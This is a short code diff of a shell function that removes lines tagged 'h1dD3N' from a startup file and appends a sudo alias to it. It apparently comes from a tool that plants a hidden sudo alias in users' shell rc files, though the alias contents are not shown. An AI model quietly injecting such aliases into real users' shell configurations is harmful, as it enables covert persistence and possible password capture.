@@ -6,7 +6,7 @@ function install_in_rc() {
     if ! [ -f "$1" ]; then
         return
     fi
-    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && cat "$1.h1dD3Nbak" > "$1" && rm "$1.h1dD3Nbak"
+    sed -i '/h1dD3N/d' "$1"
     if ! grep -q "h1dD3N" "$1"; then
         echo -ne $SUDO_ALIAS >> "$1"
     fi
